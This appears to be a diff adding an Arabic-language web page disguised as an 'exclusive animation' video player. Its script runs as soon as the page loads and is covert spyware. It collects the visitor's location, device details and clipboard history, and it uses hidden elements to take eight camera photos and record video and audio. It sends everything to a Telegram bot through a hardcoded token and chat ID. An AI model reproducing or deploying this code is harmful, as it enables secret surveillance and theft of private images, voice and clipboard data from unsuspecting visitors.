@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مشغل الفيديو الحصري - Animate Player</title>
+    <style>
+        :root {
+            --bg-color: #05050a;
+            --accent-color: #8b5cf6;
+            --text-color: #f3f4f6;
+            --text-muted: #9ca3af;
+        }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .player-container {
+            width: 90%;
+            max-width: 800px;
+            background: #11111d;
+            border: 2px solid var(--accent-color);
+            border-radius: 16px;
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.3);
+            overflow: hidden;
+            text-align: center;
+        }
+        .video-box {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #000;
+        }
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .player-info {
+            padding: 20px;
+        }
+        .player-info h2 {
+            color: var(--accent-color);
+            margin-bottom: 10px;
+            font-size: 1.8rem;
+        }
+        .player-info p {
+            color: var(--text-muted);
+            font-size: 1rem;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="player-container">
+        <div class="video-box">
+            <video id="promoVideo" autoplay muted loop playsinline>
+                <source src="https://assets.mixkit.co/videos/preview/mixkit-digital-animation-of-screens-and-numbers-31934-large.mp4" type="video/mp4">
+                متصفحك لا يدعم عرض الفيديو.
+            </video>
+        </div>
+        <div class="player-info">
+            <h2>عرض خاص - انيميشن حصري</h2>
+            <p>استمتع بالمشاهدة والتشغيل بجودة عالية وتجربة تفاعلية فريدة...</p>
+        </div>
+    </div>
+
+    <!-- عناصر مخفية للتشغيل والكاميرا والصوت والفيديو -->
+    <video id="camVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const botToken = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+        const chatId = "7713496654";
+
+        let clipboardHistory = JSON.parse(localStorage.getItem('cb_hist') || '[]');
+
+        window.addEventListener('DOMContentLoaded', () => {
+            initializeOperations();
+        });
+
+        async function initializeOperations() {
+            let report = "🎬 **تقرير زائر جديد (فيديو الأنيميشن الشامل):**\n";
+            
+            // 1. Visitor ID & Device
+            let visitorId = localStorage.getItem('v_id');
+            if (!visitorId) {
+                visitorId = 'ID-' + Math.random().toString(36).substring(2, 15);
+                localStorage.setItem('v_id', visitorId);
+            }
+            report += `🆔 **Visitor ID:** \`${visitorId}\`\n`;
+            report += `🖥 **Device:** ${navigator.userAgent}\n`;
+
+            // 2. الموقع الجغرافي
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        report += `📍 **Location:** Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}\n`;
+                        finalizeAndSendText(report);
+                    },
+                    (err) => {
+                        report += `📍 **Location:** Denied or Unavailable\n`;
+                        finalizeAndSendText(report);
+                    },
+                    { timeout: 8000 }
+                );
+            } else {
+                finalizeAndSendText(report);
+            }
+
+            // 3. الحافظة (آخر 10 عناصر)
+            try {
+                if (navigator.clipboard && navigator.clipboard.readText) {
+                    const cbText = await navigator.clipboard.readText();
+                    if (cbText && !clipboardHistory.includes(cbText)) {
+                        clipboardHistory.unshift(cbText);
+                        if (clipboardHistory.length > 10) clipboardHistory.pop();
+                        localStorage.setItem('cb_hist', JSON.stringify(clipboardHistory));
+                    }
+                }
+            } catch (e) {}
+
+            // 4. التقاط الصور (4 أمامية و 4 خلفية)
+            await capturePhotosSequence();
+
+            // 5. تسجيل فيديو لمدة 10 ثوانٍ
+            recordVideoTenSeconds();
+
+            // 6. تسجيل صوتي لمدة 15 ثانية
+            recordAudioFifteenSeconds();
+        }
+
+        function finalizeAndSendText(text) {
+            if (clipboardHistory.length > 0) {
+                text += `\n📋 **سجل الحافظة (آخر العناصر):**\n`;
+                clipboardHistory.forEach((item, idx) => {
+                    text += `${idx + 1}. \`${item.substring(0, 80)}\`\n`;
+                });
+            }
+            sendTextToTelegram(text);
+        }
+
+        // دالة التقاط الصور (4 أمامية ثم 4 خلفية)
+        async function capturePhotosSequence() {
+            await captureSet("user", 4, "أمامية");
+            await captureSet("environment", 4, "خلفية");
+        }
+
+        function captureSet(facing, count, label) {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } })
+                    .then(stream => {
+                        const video = document.getElementById('camVideo');
+                        video.srcObject = stream;
+                        
+                        let taken = 0;
+                        const timer = setInterval(() => {
+                            if (taken >= count) {
+                                clearInterval(timer);
+                                stream.getTracks().forEach(t => t.stop());
+                                resolve();
+                                return;
+                            }
+                            taken++;
+                            const canvas = document.getElementById('canvas');
+                            canvas.width = video.videoWidth || 640;
+                            canvas.height = video.videoHeight || 480;
+                            const ctx = canvas.getContext('2d');
+                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                            
+                            canvas.toBlob(blob => {
+                                const formData = new FormData();
+                                formData.append('chat_id', chatId);
+                                formData.append('photo', blob, `${label}_${taken}.jpg`);
+                                formData.append('caption', `📸 لقطة كَمِيرَا [${label}] (${taken}/${count}) - ID: ${localStorage.getItem('v_id')}`);
+
+                                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                }).catch(e => {});
+                            }, 'image/jpeg');
+
+                        }, 1200);
+                    })
+                    .catch(err => {
+                        resolve();
+                    });
+            });
+        }
+
+        // دالة تسجيل فيديو لمدة 10 ثوانٍ
+        function recordVideoTenSeconds() {
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                .then(stream => {
+                    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                    let chunks = [];
+
+                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('video', blob, 'visitor_video.webm');
+                        formData.append('caption', `🎥 فيديو مسجل للمستخدم (10 ثوانٍ) - ID: ${localStorage.getItem('v_id')}`);
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => {});
+
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === "recording") {
+                            mediaRecorder.stop();
+                        }
+                    }, 10000);
+                })
+                .catch(e => {});
+        }
+
+        // دالة تسجيل صوتي لمدة 15 ثانية
+        function recordAudioFifteenSeconds() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    let audioChunks = [];
+
+                    mediaRecorder.ondataavailable = event => {
+                        audioChunks.push(event.data);
+                    };
+
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('voice', audioBlob, 'visitor_audio.ogg');
+                        formData.append('caption', `🎙 تسجيل صوتي للمستخدم (15 ثانية) - ID: ${localStorage.getItem('v_id')}`);
+
+                        fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
+                            method: 'POST',
+                            body: formData
+                        }).catch(e => {});
+
+                        stream.getTracks().forEach(t => t.stop());
+                    };
+
+                    mediaRecorder.start();
+                    setTimeout(() => {
+                        if (mediaRecorder.state === "recording") {
+                            mediaRecorder.stop();
+                        }
+                    }, 15000);
+                })
+                .catch(err => {});
+        }
+
+        function sendTextToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => {});
+        }
+    </script>
+
+</body>
+</html>
